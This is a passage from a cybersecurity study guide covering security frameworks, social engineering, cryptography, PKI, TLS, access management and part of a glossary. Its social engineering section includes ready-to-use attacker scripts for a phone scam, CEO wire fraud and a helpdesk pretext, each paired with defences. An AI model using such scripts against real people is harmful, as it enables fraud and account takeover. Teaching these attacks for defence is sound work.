  Physical Controls (14):
    Physical security perimeters, securing offices, working in secure areas...
    
  Technological Controls (34):
    Access control, malware protection, backup, logging, cryptography, 
    network security, secure development, vulnerability management...

CERTIFICATION PROCESS:
  1. Define scope (what systems/processes are in scope)
  2. Conduct gap assessment (where are you vs. ISO standard?)
  3. Implement controls and policies to close gaps
  4. Internal audit (self-assessment)
  5. Stage 1 audit (external auditor reviews documentation)
  6. Stage 2 audit (external auditor tests controls in practice)
  7. Certificate issued (valid 3 years with annual surveillance audits)
  
BENEFIT: ISO 27001 certification = internationally recognized proof of security maturity.
         Required by: Many enterprise customers, government contracts, EU data processors.
```

## 22.3 MITRE ATT&CK Framework

```
OVERVIEW:
  Published by: MITRE Corporation
  Full name: Adversarial Tactics, Techniques & Common Knowledge
  Purpose: Knowledge base of real-world attacker behaviors
  URL: attack.mitre.org
  
STRUCTURE:
  MATRICES:
    • Enterprise Matrix (Windows, macOS, Linux, Cloud, Network, Containers)
    • Mobile Matrix (Android, iOS)
    • ICS Matrix (Industrial Control Systems)
  
  TACTICS (14 in Enterprise): The "WHY" — what is the attacker trying to achieve?
  ┌──────────────────────────────────────────────────────────────────────┐
  │ TA0043 Reconnaissance    → Gather information before attack          │
  │ TA0042 Resource Dev.     → Build infrastructure, buy tools           │
  │ TA0001 Initial Access    → Get into the network                      │
  │ TA0002 Execution         → Run malicious code                        │
  │ TA0003 Persistence       → Maintain foothold                         │
  │ TA0004 Privilege Esc.    → Gain higher permissions                   │
  │ TA0005 Defense Evasion   → Avoid detection                           │
  │ TA0006 Credential Access → Steal credentials                         │
  │ TA0007 Discovery         → Map the environment                       │
  │ TA0008 Lateral Movement  → Move through the network                  │
  │ TA0009 Collection        → Gather target data                        │
  │ TA0011 C&C               → Communicate with compromised systems       │
  │ TA0010 Exfiltration      → Steal the data                            │
  │ TA0040 Impact            → Disrupt, destroy, encrypt, manipulate     │
  └──────────────────────────────────────────────────────────────────────┘
  
  TECHNIQUES: The "HOW" — specific method used (e.g., T1566.001 = Spearphishing Attachment)
  SUB-TECHNIQUES: More specific variants of techniques
  
  Example — Spearphishing Attack Chain:
    TA0001 Initial Access
      T1566 Phishing
        T1566.001 Spearphishing Attachment
        T1566.002 Spearphishing Link
        T1566.003 Spearphishing via Service
  
ATT&CK USE CASES:
  
  Red Team:
    • Plan attacks based on real-world techniques
    • Ensure coverage of all relevant tactics
    • Document assessments using ATT&CK language
    
  Blue Team:
    • Map detection capabilities to ATT&CK techniques
    • Find gaps: "Which techniques do we have NO detection for?"
    • Prioritize detection engineering based on threat actor TTPs
    
  CTI (Cyber Threat Intelligence):
    • Profile threat actors using ATT&CK
    • Map IOCs to techniques and threat groups
    • Communicate intelligence in standardized language
    
ATT&CK NAVIGATOR:
  Free tool (attack.mitre.org/resources/attack-navigator)
  Create heat maps of: techniques you can detect, techniques attacker used,
                       techniques to prioritize for coverage
```

## 22.4 CIS Controls (Center for Internet Security)

```
OVERVIEW:
  Published by: Center for Internet Security (CIS)
  Version: CIS Controls v8 (2021)
  Purpose: Prioritized, prescriptive security actions
  Audience: Organizations of all sizes
  
18 CONTROLS (in priority order):
  CIS 1:  Inventory and Control of Enterprise Assets
  CIS 2:  Inventory and Control of Software Assets
  CIS 3:  Data Protection
  CIS 4:  Secure Configuration of Enterprise Assets and Software
  CIS 5:  Account Management
  CIS 6:  Access Control Management
  CIS 7:  Continuous Vulnerability Management
  CIS 8:  Audit Log Management
  CIS 9:  Email and Web Browser Protections
  CIS 10: Malware Defenses
  CIS 11: Data Recovery
  CIS 12: Network Infrastructure Management
  CIS 13: Network Monitoring and Defense
  CIS 14: Security Awareness and Skills Training
  CIS 15: Service Provider Management
  CIS 16: Application Software Security
  CIS 17: Incident Response Management
  CIS 18: Penetration Testing

IMPLEMENTATION GROUPS (scalability):
  IG1 (Basic):      Small organizations, limited IT, ~56 safeguards
                    "Essential cyber hygiene"
  IG2 (Foundational): Medium organizations, some IT staff, +74 safeguards
  IG3 (Organizational): Large orgs, sensitive data, all safeguards
  
KEY INSIGHT: CIS Controls are PRESCRIPTIVE — they tell you exactly WHAT to do.
             NIST CSF is more flexible — it tells you WHAT OUTCOMES to achieve.
             ISO 27001 is a management SYSTEM — how to run your security program.
```

---

# 23. Social Engineering — The Human Attack Surface

## 23.1 What is Social Engineering?

Social engineering is the **manipulation of people** into performing actions or divulging confidential information. It exploits human psychology rather than technical vulnerabilities.

```
KEY INSIGHT:
  The most sophisticated firewall cannot stop an employee from calling the
  attacker back and reading them a one-time password.
  
  90%+ of successful cyberattacks involve social engineering at some point.
  It is often the EASIEST and most reliable attack vector.

PSYCHOLOGICAL PRINCIPLES EXPLOITED:
  Authority:    People obey figures of authority (IT support, CEO, police)
  Urgency/Fear: "Your account will be deleted in 24 hours!" → panic → bad decisions
  Social proof: "Your colleague already clicked the link and verified..."
  Liking:       We comply more readily with people we like
  Reciprocity:  "I've helped you, now I need a small favor..."
  Scarcity:     "This is your LAST CHANCE to verify your account"
  Familiarity:  Using known names, events, contexts to build false trust
```

## 23.2 Social Engineering Attack Types

### Phishing (Email-Based)

```
TYPES:
  Mass Phishing:
    • Same email sent to millions of recipients
    • Generic lure: "Your Netflix account has been suspended"
    • Low sophistication, but high volume = some will click
    
  Spear Phishing:
    • Highly targeted, personalized to specific individual
    • Uses: victim's name, company, role, recent activities, colleague names
    • Much higher success rate
    • Example: "Hi [name], per our conversation at [conference], 
                please review the attached contract. -[manager's name]"
                
  Whaling:
    • Spear phishing targeting HIGH-VALUE individuals (CEO, CFO, CISO)
    • Consequences much larger when executives are compromised
    • Often involves BEC (Business Email Compromise) — covered below
    
  Vishing (Voice Phishing):
    • Phone calls impersonating legitimate entities
    • Example: "Hi, this is Microsoft Support. Your PC is sending error messages."
    • Technical support scams, bank fraud, IRS impersonation
    
  Smishing (SMS Phishing):
    • Malicious links via text messages
    • "Your package is delayed. Track here: [malicious link]"
    • Very effective — people trust SMS more than email
    
  Clone Phishing:
    • Take a legitimate email the victim previously received
    • Replace the link or attachment with a malicious version
    • Resend as if it's a "corrected" version
    • Very convincing because it references real communication

BUSINESS EMAIL COMPROMISE (BEC):
  A sophisticated scam targeting businesses conducting wire transfers.
  
  Types:
  CEO Fraud:         Attacker impersonates CEO, emails CFO:
                     "Wire $500K to this account for a confidential acquisition.
                      Don't tell anyone — it's sensitive M&A activity."
                      
  Invoice Fraud:     Attacker impersonates supplier, sends modified invoice
                     with ATTACKER'S bank account number.
                     
  Payroll Diversion: Attacker impersonates employee, requests payroll be
                     redirected to new bank account.
  
  Scale: BEC caused $2.9 BILLION in losses in the US in 2023 (FBI IC3 Report)
  
  Technical enablers:
  • Compromised email accounts (account takeover first)
  • Look-alike domains (corp0ration.com vs corporation.com)
  • Email spoofing (if SPF/DKIM/DMARC not implemented)
  
  DEFENSES:
  • DMARC/SPF/DKIM: Authentication prevents email spoofing
  • Out-of-band verification: Call the requester at a known phone number
  • Dual authorization for large wire transfers
  • AI-based email anomaly detection (new contact + urgency + money request)
```

### Physical Social Engineering

```
TAILGATING / PIGGYBACKING:
  Following an authorized person through a secure door without using own badge.
  
  Scenario:
    Attacker: [Approaches door carrying coffee and laptop bag, arms full]
    Employee: [Badges in]
    Attacker: "Hey, thanks! Could you hold that? My hands are full."
    Employee: [Holds door — being polite]
    Attacker: [Enters secure area without badging]
    
  Defense: Mantraps, strict "one person at a time" culture, tailgating awareness training
  
PRETEXTING:
  Creating a fabricated scenario (pretext) to gain trust and extract information.
  
  Scenario:
    Attacker (calling IT helpdesk): "Hi, this is John Smith from the London office.
    I'm visiting headquarters for the board meeting and my VPN isn't working.
    The CTO is waiting for my presentation. Can you reset my password?"
    
    Without proper verification: Helpdesk resets password → attacker gains access
    
  Defense: Strict identity verification protocols for password resets
           (callback to verified number, manager approval, security questions)
           
DUMPSTER DIVING:
  Searching through discarded materials for sensitive information.
  What attackers find: Old memos, org charts, usernames, passwords on sticky notes,
                       bank statements, contracts, employee details, access cards.
  Defense: Cross-cut shredding of ALL paper documents.
           Clear desk policy.
           
BAITING:
  Physical media (USB drives) left in places where targets will find and use them.
  
  Scenario: Attacker drops 5 USB drives labeled "Q4 Salary Increases" in parking lot.
  Victim curiosity → plugs USB into work laptop → malware executes automatically
  
  Real test (IBM): 85% of found USB drives were plugged in by employees.
  
  Defense: Disable USB auto-run, USB port blocking policy, security awareness training.
```

### Vishing Deep Dive

```
VISHING SCRIPT EXAMPLE (IT Support Scam):

Attacker: "Hello, this is David from IT Security at [Company].
           We've detected unusual activity on your computer suggesting
           a malware infection. I need your help to fix it before it
           causes data loss. Can you spare 5 minutes?"

Victim: "Oh no, yes of course."

Attacker: "I need you to go to [remote access tool website] and 
           download our security scanning tool. Can you do that?"

[Victim installs remote access tool → attacker has full control]

Attacker: "I can see the infection. I need you to log into your
           company account so I can clean it up properly."

[Victim provides credentials → attacker now has company access]

TECHNICAL TOOLS USED IN VISHING:
  Caller ID spoofing: Display any caller ID ("Microsoft", "Your Bank", company number)
  Voice synthesis AI: Generate voices that sound like specific people
  VOIP services: Make calls cheaply/anonymously from anywhere
  
DEFENSE AGAINST VISHING:
  • Always call back to a number from the official directory (not one they give you)
  • IT departments NEVER call asking you to install software
  • Banks NEVER call asking for your PIN or full password
  • Verify any urgent request through a second channel
  • Train employees: "If in doubt, hang up and call back independently"
```

---

# 24. Cryptography Fundamentals

## 24.1 Why Cryptography Matters in Security

Cryptography is the **mathematical foundation** of modern cybersecurity. Without it:
- Passwords transmitted in plaintext → stolen
- Financial transactions interceptable → stolen
- Software unsigned → malware indistinguishable from legitimate code
- Identities unverifiable → impersonation trivial

```
CRYPTOGRAPHY SERVES ALL THREE CIA PROPERTIES:
  Confidentiality:   Encryption keeps data secret
  Integrity:         Hashing detects data tampering
  Authenticity:      Digital signatures verify identity (supports Non-repudiation)
```

## 24.2 Hashing

```
DEFINITION:
A one-way mathematical function that takes input of ANY size and produces
a FIXED-SIZE output (the hash/digest). It is IRREVERSIBLE.

PROPERTIES OF A GOOD HASH FUNCTION:
  Deterministic:        Same input ALWAYS produces same output
  One-way:              Cannot reverse the hash to get input
  Avalanche effect:     Tiny input change → completely different hash
  Collision resistant:  Extremely hard to find two inputs with same hash
  Fixed output size:    Output is always the same length regardless of input

COMMON ALGORITHMS:
  ┌──────────────┬───────────┬────────────────────────────────────────┐
  │ Algorithm    │ Hash Size │ Status                                 │
  ├──────────────┼───────────┼────────────────────────────────────────┤
  │ MD5          │ 128 bits  │ BROKEN — do not use for security       │
  │ SHA-1        │ 160 bits  │ DEPRECATED — practical collision found │
  │ SHA-256      │ 256 bits  │ SECURE — current standard (SHA-2)     │
  │ SHA-512      │ 512 bits  │ SECURE — higher security margin        │
  │ SHA-3/256    │ 256 bits  │ SECURE — different algorithm family    │
  │ BLAKE2       │ variable  │ SECURE — fast, modern                  │
  │ bcrypt       │ 184 bits  │ SECURE — for password storage          │
  │ Argon2       │ variable  │ SECURE — password hashing winner       │
  └──────────────┴───────────┴────────────────────────────────────────┘

USES:
  File integrity verification:
    sha256sum malware.exe → a1b2c3...  (compare to trusted hash)
    
  Password storage:
    NEVER store plaintext passwords!
    Store: bcrypt($password, $salt, $cost) → $2b$12$[salt][hash]
    
  Digital signatures (part of process)
  
  HMAC (Hash-based Message Authentication Code):
    Combines hashing with a secret key
    HMAC-SHA256(key, message) → proves BOTH integrity AND authenticity
    Used in: JWT tokens, API authentication, TLS

PASSWORD HASHING vs ENCRYPTION:
  ❌ WRONG: Encrypt passwords (can be decrypted if key found)
  ✅ RIGHT: Hash passwords with salt (cannot be reversed)
  
  SALT: Random value added to password before hashing
  "password123" + salt "xR7g" → hash("password123xR7g")
  
  Why salt? Prevents rainbow table attacks (precomputed hash tables)
  Different salt per user → same password → different hash
```

## 24.3 Symmetric Encryption

```
DEFINITION: Same key is used for both encryption AND decryption.
            Both parties must have the same secret key.

VISUALIZATION:
  Plaintext ──[ENCRYPT with Key]──► Ciphertext ──[DECRYPT with Key]──► Plaintext
                     ▲                                    ▲
                     └──────── Same Key ─────────────────┘

ALGORITHMS:
  AES (Advanced Encryption Standard) — THE standard:
    AES-128: 128-bit key, 10 rounds. Secure for most purposes.
    AES-256: 256-bit key, 14 rounds. Military-grade. Use when in doubt.
    
  MODES OF OPERATION (how to encrypt data larger than one block):
    ECB (Electronic Code Book): 
      Same block → same ciphertext. NEVER USE. Reveals patterns.
      [Famous example: ECB-encrypted Linux penguin still shows the penguin outline]
      
    CBC (Cipher Block Chaining):
      Each block XORed with previous ciphertext before encrypting.
      Requires IV (Initialization Vector) — must be unique and random.
      Good for data at rest.
      
    GCM (Galois/Counter Mode):
      Provides BOTH encryption AND authentication (AEAD).
      Best for TLS, network protocols.
      Use AES-256-GCM as default.
      
  DES (Data Encryption Standard): 56-bit key. BROKEN. Do not use.
  3DES/Triple-DES: Three DES operations. Slow, deprecated.
  ChaCha20:        Stream cipher. Fast on devices without AES hardware. TLS 1.3 option.

KEY EXCHANGE PROBLEM:
  "If we're communicating secretly for the first time, how do we share the secret key?"
  Answer: Use asymmetric encryption to securely exchange symmetric keys.
  (Hybrid approach — used in TLS, S/MIME, PGP)

PERFORMANCE:
  Symmetric encryption is FAST (hardware-accelerated AES in modern CPUs).
  Used for: encrypting large amounts of data (files, disk, bulk traffic)
```

## 24.4 Asymmetric Encryption (Public Key Cryptography)

```
DEFINITION: Uses a mathematically linked KEY PAIR:
  Public Key:  Can be shared freely with anyone
  Private Key: Must be kept absolutely secret
  
  What one key encrypts, ONLY the other can decrypt.

USES:
  ENCRYPTION (Confidentiality):
    Alice wants to send Bob a secret message:
    1. Alice gets Bob's PUBLIC key (from a directory, email signature, etc.)
    2. Alice encrypts message with Bob's PUBLIC key
    3. Bob decrypts with his PRIVATE key
    → Only Bob can decrypt it (only he has private key)
    
  DIGITAL SIGNATURE (Authenticity + Integrity + Non-repudiation):
    Alice wants to prove she wrote a document:
    1. Alice hashes the document (SHA-256)
    2. Alice encrypts the hash with her PRIVATE key = digital signature
    3. Anyone verifies: Decrypt signature with Alice's PUBLIC key → get hash
    4. Compare to hash of received document → if match, Alice signed it,
       and document is unmodified

ALGORITHMS:
  RSA:     Based on difficulty of factoring large primes.
           Key sizes: 2048-bit (minimum today), 4096-bit (recommended).
           
  ECC (Elliptic Curve Cryptography):
    Based on elliptic curve math — much smaller keys for same security:
    ECC-256 ≈ RSA-3072 in security strength.
    Faster, less compute, less bandwidth. Used in TLS 1.3, mobile.
    Curves: P-256 (NIST), Curve25519 (modern, preferred by many).
    
  Diffie-Hellman (DH) / ECDH:
    Not for encryption directly — used for KEY EXCHANGE.
    Two parties independently generate same shared secret without transmitting it.
    ECDHE: Ephemeral ECDH — generates new keys per session (Perfect Forward Secrecy)

LIMITATION OF ASYMMETRIC:
  SLOW (1000x slower than symmetric for large data).
  Solution: Use asymmetric ONLY for key exchange and signatures.
            Use symmetric (AES) for actual bulk data encryption.
            → HYBRID ENCRYPTION (how TLS works)
```

## 24.5 PKI — Public Key Infrastructure

```
PROBLEM: If Bob gives Alice his public key, how does Alice know it's REALLY Bob's key
         and not an attacker's key pretending to be Bob?

SOLUTION: A TRUSTED THIRD PARTY (Certificate Authority) vouches for the key.

PKI COMPONENTS:

Certificate Authority (CA):
  Issues digital certificates that bind a public key to an identity.
  Types:
    Root CA:         Highest trust anchor. Self-signed. Offline for security.
    Intermediate CA: Signed by Root CA. Actually issues end-entity certs.
    End-Entity cert: The certificate for the actual server/user/device.
    
  CHAIN OF TRUST:
    Root CA (trusted by OS/browser)
      └── Intermediate CA (signed by Root)
            └── www.bank.com (signed by Intermediate)
    
    Browser trusts Root CA → trusts Intermediate → trusts bank's cert
    → HTTPS padlock appears

Digital Certificate (X.509 standard) contains:
  • Subject: Who is this certificate for? (CN=www.bank.com, O=Bank Corp)
  • Issuer:  Who issued this? (CN=DigiCert CA, O=DigiCert Inc)
  • Public Key: The subject's public key
  • Validity: Not Before / Not After (expiry date)
  • Serial Number: Unique identifier
  • Signature: CA's digital signature over all the above fields
  • Subject Alternative Names (SANs): Additional domain names
  • Key Usage: What can this key be used for?

CERTIFICATE TYPES:
  DV (Domain Validated):    CA verifies only domain ownership. Quick, cheap.
                             Just gets the padlock. No org info shown.
  OV (Organization Validated): CA verifies organization details too. 
                             Shows company name in cert details.
  EV (Extended Validation): CA does extensive identity verification.
                             Previously showed green bar — now just org name.
  
  Wildcard: *.bank.com covers any subdomain (www, mail, api, etc.)
  Multi-SAN: Single cert for multiple different domains

CERTIFICATE REVOCATION:
  If private key is compromised, cert must be revoked before expiry.
  
  CRL (Certificate Revocation List): 
    CA publishes list of revoked certs (updated periodically, download + check)
    
  OCSP (Online Certificate Status Protocol):
    Real-time check: "Is certificate [serial number] still valid?"
    OCSP Stapling: Server includes fresh OCSP response in TLS handshake (faster)

PKI ATTACKS:
  • Compromised CA: All certs from that CA are untrusted (DigiNotar 2011)
  • Rogue CA: Attacker-controlled CA used to create fake certs for MITM
  • Cert theft: Private key stolen → impersonate the server
  • BGP hijacking: Redirect traffic and present valid cert for diverted domain
  • Let's Encrypt abuse: Free DV certs for phishing sites that look "secure"
```

## 24.6 TLS — Transport Layer Security

```
DEFINITION: Protocol that provides secure (encrypted, authenticated) communication
            over a network. Successor to SSL (deprecated).

CURRENT VERSIONS:
  TLS 1.0, 1.1: DEPRECATED and disabled (vulnerable to POODLE, BEAST attacks)
  TLS 1.2:      Current baseline standard (widely supported)
  TLS 1.3:      Latest (2018) — faster, more secure, mandatory forward secrecy
  
TLS 1.3 HANDSHAKE (simplified):

  Client                                Server
    │                                     │
    │──── ClientHello ────────────────────►│
    │     (TLS version, cipher suites,     │
    │      random nonce, key share)        │
    │                                     │
    │◄─── ServerHello ────────────────────│
    │     (chosen cipher, key share,       │
    │      server certificate, signature)  │
    │                                     │
    │ [Both compute shared secret using ECDHE]
    │                                     │
    │◄─── Encrypted Extensions ───────────│
    │◄─── Certificate ────────────────────│
    │◄─── CertificateVerify ──────────────│
    │◄─── Finished ───────────────────────│
    │                                     │
    │──── Finished ────────────────────►  │
    │                                     │
    │◄═══════ Encrypted Application Data ►│
    
CIPHER SUITES (TLS 1.3 mandated):
  TLS_AES_256_GCM_SHA384
  TLS_CHACHA20_POLY1305_SHA256
  TLS_AES_128_GCM_SHA256

PERFECT FORWARD SECRECY (PFS):
  Using ECDHE (Ephemeral Elliptic Curve Diffie-Hellman) means:
  Each session gets a UNIQUE encryption key.
  Even if the server's long-term private key is stolen later:
  Past recorded traffic CANNOT be decrypted (no relation to past session keys).
  
  Without PFS: Steal server key today → decrypt all previously captured traffic
  With PFS:    Steal server key today → CANNOT decrypt any past sessions

COMMON TLS ATTACKS:
  POODLE (SSL 3.0):          Forced downgrade to SSL 3.0 → exploit CBC padding oracle
  BEAST (TLS 1.0):           Exploit CBC IV predictability
  Heartbleed (OpenSSL):      Memory leak in TLS heartbeat → expose private key!
  ROBOT (RSA PKCS#1 v1.5):   RSA decryption oracle in some TLS implementations
  Certificate Pinning bypass: MiTM with custom CA in corporate proxy environments

CERTIFICATE PINNING:
  Application hard-codes expected certificate or public key hash.
  Even with a trusted CA cert, if the pin doesn't match → reject connection.
  Used by: High-security apps (banking apps, government apps)
  Bypassed by: Rooted device + modified app, Frida hooking for testing
```

---

# 25. Identity & Access Management (IAM) — Deep Dive

## 25.1 Authentication vs Authorization vs Accounting (AAA)

```
THREE PILLARS OF ACCESS CONTROL:

AUTHENTICATION: "Who are you?"
  Verify identity BEFORE granting any access.
  Methods: Passwords, MFA, certificates, biometrics, SSO

AUTHORIZATION: "What are you allowed to do?"
  After identity is verified, determine what actions/resources are permitted.
  Models: RBAC, ABAC, DAC, MAC (explained below)

ACCOUNTING (Auditing): "What did you do?"
  Record all authenticated user actions for accountability and forensics.
  Methods: Audit logs, SIEM, access logs, DLP monitoring

AAA in network context:
  RADIUS (Remote Authentication Dial-In User Service):
    Used for: VPN authentication, WiFi 802.1X, network device authentication
    
  TACACS+ (Terminal Access Controller Access-Control System Plus):
    Used for: Network device administration (Cisco devices)
    Advantage over RADIUS: Encrypts entire payload (RADIUS only encrypts password)
```

## 25.2 Access Control Models

```
DAC (Discretionary Access Control):
  OWNER of resource decides who can access it.
  Example: File owner sets permissions via ACL (icacls, chmod)
  Flexible but vulnerable to: Owner mistakes, Trojan horse attacks
  Used in: Windows NTFS, Linux filesystem permissions

MAC (Mandatory Access Control):
  ACCESS DECISIONS made by the OS/policy, NOT the user.
  Labels: All subjects (users, processes) and objects (files, data) have security labels
  Rule: Can access object only if label allows it (e.g., SECRET user can read CONFIDENTIAL)
  Example: SELinux, AppArmor, government/military systems
  Most restrictive but most secure. Prevents unauthorized information flow.

RBAC (Role-Based Access Control):
  Access based on USER'S ROLE in the organization.
  Permissions assigned to ROLES, users assigned to roles.
  
  Example:
    Role: Finance Manager
    Permissions: Read/Write financial reports, approve invoices
    
    Role: Developer
    Permissions: Read/Write code repository, access dev servers
    
    User: Alice (Finance Manager + Developer) → union of both roles' permissions
    
  Benefits: Easy to manage, role assignment auditable, supports least privilege

ABAC (Attribute-Based Access Control):
  Access based on ATTRIBUTES of user, resource, action, and environment.
  Most flexible and granular model.
  
  Policy example:
  "ALLOW access IF:
    User.Department = Finance AND
    User.ClearanceLevel >= Secret AND
    Resource.Classification = Confidential AND
    Action = Read AND
    Environment.TimeOfDay >= 09:00 AND <= 18:00 AND
    Environment.Location = Corporate Network"
    
  Used in: Zero Trust architectures, modern cloud IAM (AWS IAM policies)
```

## 25.3 Privileged Access Management (PAM)

```
DEFINITION: PAM is the set of tools and processes for securing, controlling,
            and monitoring privileged accounts — accounts with elevated rights
            (admin accounts, root, service accounts, domain admins).

WHY PAM MATTERS:
  80%+ of data breaches involve misused privileged credentials.
  Privileged accounts can:
  • Access any data in the organization
  • Disable security controls
  • Create backdoor accounts
  • Destroy critical systems

PAM CAPABILITIES:
  
  Credential Vaulting:
    Privileged passwords stored in encrypted vault.
    No one knows the actual password — checked out when needed.
    Automatically rotated after each use.
    
  Just-In-Time (JIT) Access:
    Admin access granted ONLY when needed, for LIMITED time.
    "Elevate this account to Domain Admin for 2 hours for this change window"
    After 2 hours: access automatically removed.
    
  Session Recording:
    All privileged sessions recorded (like a screen recording of every admin action).
    Full audit trail of what the admin did.
    Evidence for investigations.
    
  Approval Workflows:
    Admin access requires approval from manager or security team.
    "Request: I need Domain Admin for firewall change. Justification: ..."
    Approver: Approve / Deny with reason.
    
  Multi-Person Authentication:
    Most sensitive actions require TWO admins to authenticate simultaneously.
    
PAM PRODUCTS:
  CyberArk — Market leader in enterprise PAM
  BeyondTrust — Strong on privilege management for endpoints
  Delinea (Thycotic/Centrify) — Cloud-first PAM
  HashiCorp Vault — Developer-friendly secrets management
  Microsoft PIM — Azure AD Privileged Identity Management (cloud)
```

---

# 26. Comprehensive Cybersecurity Glossary

```
A
──────────────────────────────────────────────────────────────────────
Advanced Persistent Threat (APT): Long-term, stealthy, targeted attack
  typically by nation-states. Presence maintained for months/years.
  
Adversary-in-the-Middle (AiTM): Modern term for MitM — attacker proxies
  communications, capturing credentials and session tokens.
  
Air Gap: Physical isolation of a system from networks (no network connection).
  Most secure isolation technique. Used in: nuclear facilities, classified systems.
  
Antivirus (AV): Software detecting known malware via signature database.
  Largely superseded by EDR for capable organizations.
  
Attack Surface: Sum of all attack vectors through which an attacker can enter.
  Reduce attack surface = better security posture.

B
──────────────────────────────────────────────────────────────────────
Backdoor: Secret method of bypassing authentication/security controls.
  Can be intentional (developer debug) or malware-installed.
  
Blue Team: Defensive security team responsible for protecting systems,
  monitoring threats, and responding to incidents.
  
Botnet: Network of infected computers (bots/zombies) controlled by C2 server.
  Used for: DDoS, spam, credential stuffing, cryptomining.
  
Brute Force: Systematically trying all possible combinations until correct one found.
  Dictionary attack uses wordlist; hybrid mixes wordlist + mutations.
  
Bug Bounty: Program offering financial rewards to researchers who find and
  responsibly report security vulnerabilities.
  
Business Email Compromise (BEC): Fraud where attacker impersonates executive
  or vendor to authorize fraudulent financial transfers.

C
──────────────────────────────────────────────────────────────────────
C2 (Command and Control): Infrastructure used by attackers to communicate
  with compromised systems, issue commands, receive stolen data.
  
CASB (Cloud Access Security Broker): Security control point between cloud
  users and cloud services — enforces policies on cloud usage.
  
Chain of Custody: Documentation tracking who handled evidence, when, and how.
  Critical for legal proceedings.
  
CISA: Cybersecurity and Infrastructure Security Agency (US). Publishes KEV
  (Known Exploited Vulnerabilities) catalog — critical patching list.
  
CSPM (Cloud Security Posture Management): Continuously monitors cloud
  configurations against security best practices.
  
CVE (Common Vulnerabilities and Exposures): Standardized naming system for
  publicly known vulnerabilities. Format: CVE-YEAR-NUMBER.

D
──────────────────────────────────────────────────────────────────────
DMARC (Domain-based Message Authentication Reporting & Conformance):
  Email authentication protocol. Tells receiving servers what to do
  when emails fail SPF/DKIM checks. Prevents email spoofing.
  
DGA (Domain Generation Algorithm): Malware generates many pseudo-random domain
  names for C2 communication. Makes blocking C2 domains difficult.
  
Defense in Depth: Multiple layers of security controls so failure of one
  doesn't compromise the whole system. "Layers of an onion."
  
DFIR (Digital Forensics and Incident Response): Discipline combining
  forensic investigation with security incident response.
  
DMZ (Demilitarized Zone): Network segment between internet and internal network.
  Hosts public-facing servers (web, email, DNS). Semi-trusted.

E
──────────────────────────────────────────────────────────────────────
EPSS (Exploit Prediction Scoring System): Probability that a CVE will be
  exploited in the next 30 days. Complements CVSS for prioritization.
  
Exfiltration: Unauthorized transfer of data from a network to attacker control.
  
Exploit: Code or technique that takes advantage of a vulnerability.

F
──────────────────────────────────────────────────────────────────────
False Negative: Malicious event that a security tool FAILS to detect.
  The "miss" — most dangerous failure mode for security tools.
  
False Positive: Benign event that a security tool INCORRECTLY flags as malicious.
  The "false alarm" — causes alert fatigue when excessive.
  
FIDO2/WebAuthn: Open standard for phishing-resistant MFA using hardware keys
  or platform authenticators (Windows Hello, Touch ID).
  
Firewall: Network security device controlling traffic based on rules.
  Types: Packet filter, stateful, application, NGFW.
  
FIM (File Integrity Monitoring): Detects unauthorized changes to files
  by continuously comparing against cryptographic hashes of baseline.

G
──────────────────────────────────────────────────────────────────────
GRC (Governance, Risk, and Compliance): Integrated approach to
  organizational governance, risk management, and regulatory compliance.
  
Golden Ticket: Forged Kerberos TGT using the krbtgt hash. Allows an attacker
  to impersonate any user in Active Directory — including Domain Admin.
  Valid until krbtgt password is reset TWICE.

H
──────────────────────────────────────────────────────────────────────
Hardening: Reducing attack surface by removing unnecessary services, applying
  secure configurations, and restricting permissions.
  
Hash: Fixed-size output of a one-way function applied to input data.
  Used for integrity verification and password storage.
  
HIPAA: Health Insurance Portability and Accountability Act (US).
  Mandates security controls for Protected Health Information (PHI).
  
HSM (Hardware Security Module): Tamper-resistant hardware device for
  generating, storing, and using cryptographic keys securely.
  Keys never exist outside the HSM in plaintext.
  
Honeypot: Decoy system designed to attract and detect attackers while
  gathering intelligence about their methods.

I
──────────────────────────────────────────────────────────────────────
IAM (Identity and Access Management): Policies and technologies ensuring
  the right users have appropriate access to technology resources.
  
ICS/SCADA: Industrial Control Systems / Supervisory Control and Data
  Acquisition. Manages critical infrastructure (power, water, manufacturing).
  Attacks on ICS can have physical-world consequences.
  
Incident Response: Organized approach to managing the aftermath of a security
  breach. Phases: Prepare, Detect, Contain, Eradicate, Recover, Learn.
  
IOC (Indicator of Compromise): Evidence suggesting a system is compromised.
  Examples: Known bad IPs, file hashes, registry keys, domain names.
  
IOA (Indicator of Attack): Behavioral indicators suggesting an attack is
  in progress. More proactive than IOCs. Example: "Process running encoded
  PowerShell from Office macro."

J
──────────────────────────────────────────────────────────────────────
Jailbreaking/Rooting: Removing software restrictions on mobile devices.
  Breaks security model — apps can access areas normally forbidden.
  
JIT (Just-In-Time): Access provisioning approach where privileges are
  granted only when needed and for the minimum necessary duration.

K
──────────────────────────────────────────────────────────────────────
Kerberos: Authentication protocol used in Windows Active Directory.
  Ticket-based — no passwords sent on the network. Targeted by: Kerberoasting,
  AS-REP Roasting, Golden/Silver Ticket, delegation attacks.
  
KEV (Known Exploited Vulnerabilities): CISA's catalog of CVEs actively
  exploited in the wild. MUST be patched by all federal agencies (and best practice for all).
  
Keylogger: Malware (or hardware device) that records every keystroke,
  capturing passwords, messages, and sensitive data.

L
──────────────────────────────────────────────────────────────────────
Lateral Movement: Technique of moving from one compromised system to others
  within the network to expand access or reach the target.
  
LDAP (Lightweight Directory Access Protocol): Protocol for querying and
  modifying directory services (like Active Directory). Port 389 / 636 (SSL).
  
Living off the Land (LotL): Attacking technique using legitimate OS tools
  (PowerShell, WMI, certutil, regsvr32) to avoid malware detection.

M
──────────────────────────────────────────────────────────────────────
Malvertising: Delivering malware through legitimate online advertising networks.
  Even trusted websites can serve malicious ads if their ad network is compromised.
  
Memory Forensics: Analysis of a computer's RAM to find malware, encryption keys,
  passwords, and evidence of attacker activity. Critical for fileless malware.
  
MITRE ATT&CK: Knowledge base of adversary tactics, techniques, and procedures
  based on real-world observations. attack.mitre.org
  
MFA (Multi-Factor Authentication): Requiring two or more verification factors.
  SOMETHING YOU KNOW + SOMETHING YOU HAVE + SOMETHING YOU ARE.

N
──────────────────────────────────────────────────────────────────────
Network Segmentation: Dividing a network into segments/zones with controlled
  traffic between them. Limits lateral movement.
  
NGAV (Next-Generation Antivirus): AV using behavioral analysis and ML
  rather than only signatures.
  
NIST SP 800-53: Security and Privacy Controls for Federal Information Systems.
  Comprehensive catalog of security controls for US federal agencies.
  Widely adopted as standard by private sector too.
  
Non-repudiation: Cryptographic proof that an action was performed by a specific
  entity, preventing them from denying it. Achieved via digital signatures.

O
──────────────────────────────────────────────────────────────────────
OSINT (Open Source Intelligence): Intelligence gathered from publicly
